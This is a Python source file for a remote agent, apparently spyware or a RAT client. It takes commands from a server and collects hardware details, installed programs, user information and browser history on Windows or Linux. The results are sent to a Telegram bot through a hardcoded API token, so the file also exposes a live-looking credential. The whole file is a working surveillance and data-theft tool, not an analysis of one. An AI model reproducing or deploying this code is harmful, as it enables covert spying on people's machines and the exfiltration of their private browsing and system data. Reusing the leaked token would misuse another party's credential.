import socket
import platform
import subprocess
import os
import telebot
from def_lin import *
from def_win import *

KEY_API = "6849345429:AAFDRM9v0KkNKjlLH59epOcwvcCntyH1fZU"
bot = telebot.TeleBot(KEY_API)

def connect_to_server():
    server_host = '127.0.0.1'
    server_port = 5757
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_host, server_port))

    try:
        HOSTNAME = socket.gethostname()
        IP = socket.gethostbyname(HOSTNAME)
        USERNAME = os.getlogin()

        client.send(f"HOST: {HOSTNAME}, USER: {USERNAME}".encode('utf-8'))

        while True:
            command = client.recv(1024).decode('utf-8')
            if command == 'exit':
                break
            process_server_command(command)

    except Exception as e:
        print(f"Erro: {e}")

    finally:
        client.close()

def process_server_command(command):
    SO = platform.system()

    if SO == 'Windows':
        response = process_command_windows(command)
    elif SO == 'Linux':
        response = process_command_linux(command)
    else:
        response = 'Sistema operacional não suportado'

    send_response_to_bot(response)

def process_command_windows(command):
    try:
        if command == '/info_h':
            response = infohardwareW()
        elif command == '/info_p':
            response = progwindows()
        elif command == '/info_u':
            response = informacoes_usuario_logadoW()
        elif command == '/historic':
            response = hisgoogleW()
        elif command == '/listclient':
            response = lista_agentes_onlineW()
        else:
            response = 'Comando inválido'

        return response

    except Exception as e:
        print(f"Erro ao processar comando Windows: {e}")
        return f"Erro ao processar comando Windows: {e}"

def process_command_linux(command):
    try:
        if command == '/info_h':
            response = infohardwareL()
        elif command == '/info_p':
            response = lista_programas_instaladosL()
        elif command == '/info_u':
            response = informacoes_usuario_logadoL()
        elif command == '/historic':
            response = historico_navegacaoL()
        elif command == '/listclient':
            response = lista_agentes_onlineL()
        else:
            response = 'Comando inválido'

        return response

    except Exception as e:
        print(f"Erro ao processar comando Linux: {e}")
        return f"Erro ao processar comando Linux: {e}"

def send_response_to_bot(response):
    if response:
        bot.send_message(chat_id='@seu_chat_id', text=response)

if __name__ == "__main__":
    connect_to_server()
